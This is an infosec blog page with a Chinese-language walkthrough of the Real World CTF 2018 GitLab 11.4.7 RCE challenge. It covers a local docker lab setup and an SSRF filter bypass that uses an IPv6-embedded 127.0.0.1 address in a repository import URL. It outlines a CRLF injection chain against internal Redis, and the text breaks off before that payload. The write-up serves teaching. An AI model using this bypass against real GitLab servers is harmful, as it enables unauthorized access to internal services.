@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="TL;DRgit:&#x2F;&#x2F;协议中的CLRF注入将RCE中的IPv6&#x2F;IPv4地址嵌入链。 youtube vedio by liveoverflow GitLab 11.4.7 Remote Code Execution-Real World CTF 2018  说明在real world CTF上，一个叫做flaglab的有趣的web挑战。描述说: 1&quot;You">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gitlab-11.4.7远程代码执行漏洞及exp史诗级详细剖析">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/12/17/gitlab-remote-code-execution/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="TL;DRgit:&#x2F;&#x2F;协议中的CLRF注入将RCE中的IPv6&#x2F;IPv4地址嵌入链。 youtube vedio by liveoverflow GitLab 11.4.7 Remote Code Execution-Real World CTF 2018  说明在real world CTF上，一个叫做flaglab的有趣的web挑战。描述说: 1&quot;You">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/gitlab-rce-1.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/gitlab-rce-2.gif">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/gitlab-rce-3.gif">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/gitlab-rce-4.gif">
+<meta property="article:published_time" content="2020-12-17T11:12:22.000Z">
+<meta property="article:modified_time" content="2020-12-17T17:03:34.529Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="远程代码执行漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/gitlab-rce-1.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/12/17/gitlab-remote-code-execution/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/12/17/gitlab-remote-code-execution/","path":"2020/12/17/gitlab-remote-code-execution/","title":"gitlab-11.4.7远程代码执行漏洞及exp史诗级详细剖析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>gitlab-11.4.7远程代码执行漏洞及exp史诗级详细剖析 | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#TL-DR"><span class="nav-number">1.</span> <span class="nav-text">TL;DR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#youtube-vedio-by-liveoverflow"><span class="nav-number">2.</span> <span class="nav-text">youtube vedio by liveoverflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%B4%E6%98%8E"><span class="nav-number">3.</span> <span class="nav-text">说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE"><span class="nav-number">4.</span> <span class="nav-text">设置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bugs"><span class="nav-number">5.</span> <span class="nav-text">bugs</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">5.1.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E8%AE%BA%E5%92%8C%E6%94%B6%E8%8E%B7"><span class="nav-number">6.</span> <span class="nav-text">结论和收获</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/12/17/gitlab-remote-code-execution/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="gitlab-11.4.7远程代码执行漏洞及exp史诗级详细剖析 | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          gitlab-11.4.7远程代码执行漏洞及exp史诗级详细剖析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-12-17 19:12:22" itemprop="dateCreated datePublished" datetime="2020-12-17T19:12:22+08:00">2020-12-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-12-18 01:03:34" itemprop="dateModified" datetime="2020-12-18T01:03:34+08:00">2020-12-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">漏洞原理</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>git:&#x2F;&#x2F;协议中的CLRF注入将RCE中的<span class="exturl" data-url="aHR0cDovL3d3dy50Y3BpcGd1aWRlLmNvbS9mcmVlL3RfSVB2NklQdjRBZGRyZXNzRW1iZWRkaW5nLmh0bQ==">IPv6&#x2F;IPv4地址嵌入<i class="fa fa-external-link-alt"></i></span>链。</p>
+<h2 id="youtube-vedio-by-liveoverflow"><a href="#youtube-vedio-by-liveoverflow" class="headerlink" title="youtube vedio by liveoverflow"></a>youtube vedio by liveoverflow</h2><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1MckxKdXlBZG9BZyZmZWF0dXJlPXlvdXR1LmJl">GitLab 11.4.7 Remote Code Execution-Real World CTF 2018<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>在<span class="exturl" data-url="aHR0cHM6Ly9yZWFsd29ybGRjdGYuY29tLw==">real world CTF<i class="fa fa-external-link-alt"></i></span>上，一个叫做flaglab的有趣的web挑战。描述说:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;You might need a 0day&quot;</span></span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+
+<p>有一个挑战的链接，还有一个docker-compose.yml文件的下载链接。在访问挑战站点时，GitLab表示欢迎。docker-compose.yml文件可以用来设置这个实例的本地版本。在docker-compose.yml, docker映像被设置为gitlab&#x2F;gitlab-ce:11.4.7-ce.0。在对gitlab版本做谷歌搜索时，偶然发现了一篇关于gitlab补丁发布的博客文章，它似乎是最新的版本——该博客文章创建于2018年11月21日，CTF是在2018年12月1日举行。因为GitLab有庞大的代码库，所以认为根本不可能在它身上找到一天的时间，这只是在浪费时间……</p>
+<p>但事实证明，在这些假设上是错误的。一些来自RPISEC的人说，它不是最新版本–有一个新版本11.4.8，并且新版本的提交历史显示了几个安全补丁。其中一个漏洞是“Webhooks中的SSRF”，这是Chaitin Tech的nyangawa报告的(Chaitin Tech也是组织real world CTF的公司)。</p>
+<h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><p>现在开始设置GitLab漏洞版本的本地副本。可以从docker-compose.yml文件开始。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">web:</span><br><span class="line">  image: <span class="string">&#x27;gitlab/gitlab-ce:11.4.7-ce.0&#x27;</span></span><br><span class="line">  restart: always</span><br><span class="line">  hostname: <span class="string">&#x27;gitlab.example.com&#x27;</span></span><br><span class="line">  environment:</span><br><span class="line">    GITLAB_OMNIBUS_CONFIG: |</span><br><span class="line">      external_url <span class="string">&#x27;http://gitlab.example.com&#x27;</span></span><br><span class="line">      redis[<span class="string">&#x27;bind&#x27;</span>]=<span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">      redis[<span class="string">&#x27;port&#x27;</span>]=6379</span><br><span class="line">      gitlab_rails[<span class="string">&#x27;initial_root_password&#x27;</span>]=File.<span class="built_in">read</span>(<span class="string">&#x27;/steg0_initial_root_password&#x27;</span>)</span><br><span class="line">  ports:</span><br><span class="line">    - <span class="string">&#x27;5080:80&#x27;</span></span><br><span class="line">    - <span class="string">&#x27;50443:443&#x27;</span></span><br><span class="line">    - <span class="string">&#x27;5022:22&#x27;</span></span><br><span class="line">  volumes:</span><br><span class="line">    - <span class="string">&#x27;./srv/gitlab/config:/etc/gitlab&#x27;</span></span><br><span class="line">    - <span class="string">&#x27;./srv/gitlab/logs:/var/log/gitlab&#x27;</span></span><br><span class="line">    - <span class="string">&#x27;./srv/gitlab/data:/var/opt/gitlab&#x27;</span></span><br><span class="line">    - <span class="string">&#x27;./steg0_initial_root_password:/steg0_initial_root_password&#x27;</span></span><br><span class="line">    - <span class="string">&#x27;./flag:/flag:ro&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>从上面的YAML文件中，可以得出以下结论:</p>
+<ul>
+<li>使用的docker映像是GitLab Community Edition 11.4.7 GitLab -ce:11.4.7-ce.0。</li>
+<li>Redis服务器运行在6379端口，它正在监听本地主机。</li>
+<li>使用一个名为steg0_initial_root_password的文件设置rails initial_root_password</li>
+<li>有一些端口从docker容器映射到我们的机器，这将应用程序暴露在容器外供我们操作。我们将使用运行在端口5080上的HTTP服务。</li>
+<li>此外，还有卷，它挂载docker容器内的本地文件和文件夹。例如，机器上的.&#x2F;srv&#x2F;gitlab&#x2F;logs将被挂载到docker容器内的&#x2F;var&#x2F;log&#x2F;gitlab。密码文件和flag也被复制到容器中。</li>
+</ul>
+<p>使用以下命令创建这些所需的文件和文件夹:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Create required folders for the gitlab logs, data and configs. leave it empty</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ./srv/gitlab/config ./srv/gitlab/data ./srv/gitlab/logs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a random password using python</span></span><br><span class="line">python3 -c <span class="string">&quot;import secrets; print(secrets.token_urlsafe(16))&quot;</span> &gt; ./steg0_initial_root_password</span><br><span class="line"><span class="comment"># ==OR==</span></span><br><span class="line"><span class="comment"># Choose your own password</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;my_sup3r_s3cr3t_p455w0rd_4ef5a2e1&quot;</span> &gt; ./steg0_initial_root_password</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a test flag</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;RWCTF&#123;this_is_flaglab_flag&#125;&quot;</span> &gt; ./flag</span><br></pre></td></tr></table></figure>
+
+<p>现在有了所需的文件和文件夹，可以使用以下命令启动docker容器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose up</span><br></pre></td></tr></table></figure>
+
+<p>下载基本映像并构建gitlab实例的过程可能需要几分钟。在您开始查看一些日志之后，应该能够浏览到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5080/ </span><br></pre></td></tr></table></figure>
+
+<p>以获得易受攻击的GitLab版本。</p>
+<p>现在是时候配置chrome浏览器来使用代理服务器了。你可以在设置中手动修改，也可以通过命令行操作，这样更方便。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path/to/chrome --proxy-server=<span class="string">&quot;127.0.0.1:8080&quot;</span> --profile-directory=Proxy --proxy-bypass-list=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>遇到过Burp套件代理无法拦截本地主机请求的问题，即使旁路列表是空的。因此，一个快速的解决方法是在hosts文件中添加一个条目，如下所示。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1     localhost.com</span><br></pre></td></tr></table></figure>
+
+<p>现在浏览</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost.com:5080</span><br></pre></td></tr></table></figure>
+<p>通过Burp套件代理访问GitLab。这就是所有的设置!</p>
+<h2 id="bugs"><a href="#bugs" class="headerlink" title="bugs"></a>bugs</h2><p>正如已经知道的，当时认为11.4.7是GitLab的最新版本，但实际上，有一个更新的版本11.4.8，在提交中有许多安全补丁。其中一个漏洞与SSRF有关，它甚至提到了Chaitin Tech，该公司负责托管real world CTF。此外，还知道flag文件位于&#x2F;(文件系统的&#x2F;root)，因此需要一个任意文件读取或远程代码执行漏洞。现在来看看针对<a href="">SSRF和其他潜在bug</a>的那些<span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuY29tL2dpdGxhYi1vcmcvZ2l0bGFiLWZvc3MvLS9jb21taXRzL3YxMS40Ljg=">补丁<i class="fa fa-external-link-alt"></i></span>。在顶部，将发现3个与安全相关的提交。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/gitlab-rce-1.jpg"></li>
+</ul>
+<p>在Webhooks中有SSRF，也有XSS，但它不是那么有趣，最后，在有CRLF注入(Carriage-Return&#x2F;Line-Feed) ，它基本上是换行注入。如果查看SSRF问题的修复并向下滚动一点，将看到有一些单元测试可以确认该问题的修复。这些测试告诉如何利用漏洞，这正是想要的。看看一些测试用例，显然，嵌入IPv4地址的特殊IPv6地址可以绕过SSRF检查。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SSRF protection Bypass</span></span><br><span class="line">https://[0:0:0:0:0:ffff:127.0.0.1]</span><br></pre></td></tr></table></figure>
+
+<p>另一个问题是项目钩子中的CRLF漏洞，向下滚动到测试用例，可以看到它只是带换行的url。要么是URL编码的，要么就是普通的换行符。现在的问题是，这些漏洞能帮助利用GitLab来获得flag吗?通过链接这两个bug，可以得到一个远程代码执行。这实际上是一个典型的安全问题。基本上，SSRF或服务器端请求伪造用于针对本地内部Redis数据库，该数据库广泛用于不同类型的工作者。因此，如果可以推出一个恶意的worker，可能会以一个远程代码执行漏洞而告终。事实上，GitLab之前已经被这样利用过好几次了，有很多类似的bug bounty文章。不记得第一次使用这种技术是在哪里，但记得是<span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9hZ2FycmlfZnIv">@Agarri_FR<i class="fa fa-external-link-alt"></i></span>在2015年发的<span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9hZ2FycmlfZnIvc3RhdHVzLzYwNjU2OTA5NzEzMjk1MzYwMg==">推特<i class="fa fa-external-link-alt"></i></span>上说的，2014年他也有一篇<span class="exturl" data-url="aHR0cHM6Ly93d3cuYWdhcnJpLmZyL2Jsb2cvYXJjaGl2ZXMvMjAxNC8wOS8xMS90cnlpbmdfdG9faGFja19yZWRpc192aWFfaHR0cF9yZXF1ZXN0cy9pbmRleC5odG1s">博文-Trying to hack Redis via HTTP requests<i class="fa fa-external-link-alt"></i></span>。确实遇到了很多关于bug的赏金文章，所以每个对网络安全感兴趣的人都应该知道这个。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>现在看看有趣的东西，首先，看看是否能在某处触发SSRF。首先，考虑将webhook(用于在储存库中触发任何事件时, 向URL发送请求)作为目标，就像<span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuY29tL2dpdGxhYi1vcmcvZ2l0bGFiLWZvc3MvLS9pc3N1ZXMvNTMyNDI=">这里<i class="fa fa-external-link-alt"></i></span>提到的那样。然而，当点击创建一个新项目时，看到了多种导入项目的方法，其中一种是通过URL repo，它基本上会在你指定URL时获取repo。可以在http:&#x2F;&#x2F;，上导入repo https:&#x2F;&#x2F; 和 git:&#x2F;&#x2F;。因此，为了测试这一点，可以尝试使用以下URL导入repo。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/somerepo.git</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/gitlab-rce-2.gif"></li>
+</ul>
+<p>但是得到的错误是“Import URL is blocked: Requests to localhost are not allowed”。</p>
+<p>现在，可以尝试使用特殊的IPv6地址绕过。如果把导入URL替换成下面的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]:1234/test/ssrf.git</span><br></pre></td></tr></table></figure>
+
+<p>在使用这个URL导入之前，需要一个服务器监听端口1234以确认SSRF。为此，可以在docker容器上获得一个root shell来安装netcat，然后监听端口1234以查看是否触发了SSRF。首先，继续并列出所有正在运行的Docker容器，以了解应该在哪个容器上安装shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get a list of running docker containers</span></span><br><span class="line">$ docker ps</span><br><span class="line">CONTAINER ID    IMAGE                           COMMAND    CREATED    STATUS    NAMES</span><br><span class="line">bd9daf8c07a6    gitlab/gitlab-ce:11.4.7-ce.0      ...        ...        ...      ...</span><br></pre></td></tr></table></figure>
+
+<p>现在只有一个在运行，是GitLab 11.4.7。通过指定容器ID，可以使用以下命令获得容器上的shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="built_in">exec</span> -i -t bd9daf8c07a6 <span class="string">&quot;/bin/bash&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里,</p>
+<ul>
+<li>bd9daf8c07a6是容器ID。</li>
+<li>-i 的意思是与&#x2F;bin&#x2F;bash的交互</li>
+<li>-t 表示创建tty</li>
+<li>-a 用于交互的伪终端</li>
+</ul>
+<p>现在已经有了shell，可以安装netcat，这样就可以设置一个简单的服务器来侦听传入的SSRF请求。</p>
